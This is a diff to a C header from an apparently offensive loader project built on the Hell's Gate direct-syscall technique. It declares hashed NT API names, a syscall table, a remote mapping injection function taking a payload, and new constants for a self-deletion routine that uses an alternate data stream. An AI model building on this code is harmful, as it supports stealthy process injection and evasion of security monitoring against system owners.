@@ -1,4 +1,5 @@
 #pragma once
+#pragma comment(lib, "ntdll.lib")
 
 #include "Common.h"
 
@@ -10,6 +11,10 @@
 #define NtCreateThreadExHashValue			0x93EC9D3D
 #define NtWaitForSingleObjectHashValue		0xC6F6AFCD
 #define NtQuerySystemInformationHashValue	0xEFFC1CF8
+#define NtSetInformationFileHashValue		0x8A04AED4
+
+// New alternate datastream name used in HellsGate.c/SelfDeletion()
+#define NEW_STREAM L":DummyStream"
 
 // Data structures
 typedef struct _VX_TABLE_ENTRY {
@@ -45,3 +50,4 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 
 /// Global variables
 extern VX_TABLE g_SyscallsTable;
+
